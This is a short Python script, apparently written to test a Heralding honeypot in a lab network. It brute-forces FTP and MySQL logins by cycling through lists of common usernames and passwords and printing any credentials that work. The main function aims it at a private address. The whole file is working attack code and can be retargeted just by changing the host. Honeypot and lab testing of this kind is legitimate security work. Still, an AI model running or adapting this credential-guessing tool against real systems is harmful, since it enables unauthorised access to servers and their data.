# scripts/attack_heralding.py

import ftplib
import traceback

# Funcion para brute force de credenciales en ftp
def brute_force_ftp(host, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(host, port)
                    ftp.login(username, password)
                    print(f"Credenciales encontradas: {username}:{password}")
                    return True
            except Exception as e:
                print(f"Error al intentar iniciar sesión: {e}")
                #traceback.print_exc()

    print("[+] Credenciales no encontradas")



import mysql.connector

# Funcion para brute force de credenciales en mysql
def brute_force_mysql(host, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                conn = mysql.connector.connect(host=host, port=port, user=username, password=password)
                print(f"Credenciales encontradas: {username}:{password}")
                conn.close()
                return True
            except mysql.connector.Error as err:
                print(f"Error al intentar iniciar sesión: {err}")


def main():
    host = "172.18.0.2"
    user_list = ["admin", "root", "john", "phil"]
    passw_list = ["admin", "root", "1234", "password"]

    # brute_force_ftp(host, 21, user_list, passw_list)
    brute_force_mysql(host, 3306, user_list, passw_list)

if __name__ == "__main__":
    main()
